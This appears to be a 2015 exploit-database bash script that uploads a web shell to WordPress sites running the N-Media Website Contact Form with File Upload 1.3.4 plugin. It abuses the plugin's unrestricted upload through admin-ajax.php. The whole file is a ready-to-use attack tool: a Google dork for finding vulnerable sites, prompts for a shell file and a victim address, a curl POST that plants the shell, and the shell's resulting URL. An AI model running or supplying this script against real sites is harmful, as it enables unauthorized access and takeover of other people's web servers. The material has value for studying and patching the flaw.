#!/bin/bash
#
# Exploit Title : Wordpress N-Media Website Contact Form with File Upload 1.3.4
# Google Dork : inurl:"/uploads/contact_files/"
# Exploit Author : Claudio Viviani
# Vulnerability discovered by : Claudio Viviani
# Script Written by : F17.c0de
# Software link : https://downloads.wordpress.org/plugin/website-contact-form-with-file-upload.1.3.4.zip
# Version : 1.3.4
# Tested on : Kali Linux 1.1.0a / Curl 7.26.0
# Info: The "upload_file()" ajax function is affected from unrestircted file upload vulnerability
# Response : {"status":"uploaded","filename":"YOURSHELL"}
# Shell location http://VICTIM/wp-content/uploads/contact_files/YOURSHELL


echo '
+---------------------------------------------------------------+
|                                                               |
| Wordpress N-Media Website Contact Form with File Upload 1.3.4 |
|                                                               |
+---------------------------------------------------------------+
|                                                               |
|	Script by	   : F17.c0de                           |
|	Vuln Discovered by : Claudio Viviani                    |
|	Date		   : 15.04.2015                         |
|	Google Dork	   : inurl:"/uploads/contact_files/"    |
|	Vulnerability	   : "upload_file()" on admin-ajax.php  |
|	Description	   : Auto shell uploader                |
|                                                               |
+---------------------------------------------------------------+
|                       No System is Safe                       |
+---------------------------------------------------------------+
'

echo -n -e "Path of your shell: "
read bd
echo -n -e "Victim address [ex: http://www.victim.com]: "
read st
sleep 1
echo
echo "Uploading Shell. . ."
echo

curl -k -X POST -F "action=upload" -F "Filedata=@./$bd" -F "action=nm_webcontact_upload_file" $st/wp-admin/admin-ajax.php

echo
echo
echo "Job Finished"
echo

